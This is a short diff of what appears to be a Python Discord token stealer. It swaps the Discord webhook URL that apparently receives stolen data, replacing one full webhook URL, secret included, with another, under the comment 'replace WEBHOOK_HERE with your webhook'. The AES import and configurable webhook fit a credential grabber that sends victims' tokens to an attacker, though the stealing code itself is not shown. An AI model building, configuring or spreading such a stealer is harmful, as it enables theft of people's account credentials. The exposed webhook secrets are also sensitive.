@@ -15,7 +15,7 @@ from re import findall, match
 from Crypto.Cipher import AES
 
 config = {
-    'webhook': "https://discord.com/api/webhooks/963500644252147812/FZoTvOeifr_K8tnIkCvouStTD3Z5bb5My4dU2yPsULXsCKJ6J9bcTKwkXtfxBuoijWcS" #replace WEBHOOK_HERE with your webhook
+    'webhook': "https://discord.com/api/webhooks/1115402629850353755/5XCbsrsCydGSbTZ6DrfcCSB9GLvcod3_qBbhPLM2jBH6NM7dvOrsKmPklZBpo97dDnMU" #replace WEBHOOK_HERE with your webhook
 }
 
 class functions(object):
